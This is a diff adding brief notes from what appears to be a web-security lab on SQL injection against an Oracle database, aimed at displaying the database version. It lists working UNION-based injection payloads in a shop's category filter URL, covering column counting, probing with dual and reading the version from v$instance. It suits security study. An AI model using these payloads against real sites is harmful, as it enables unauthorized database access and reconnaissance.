@@ -1,0 +1,17 @@
+SQL injection attack, querying the database type and version on Oracle
+
+END GOAL: display the database version string
+
+Method:
+
+UNION attack to retrieve the results
+
+UNION SELECT 'abc' FROM dual
+
+/filter?category=Gifts'order+by+3--
+
+/filter?category=Gifts'union+select+NULL,NULL+from+dual--
+
+/filter?category=Gifts'union+select+'cvs','sdcsv'+from+dual--
+
+/filter?category=Gifts'union+select+version,NULL+from+v$instance--
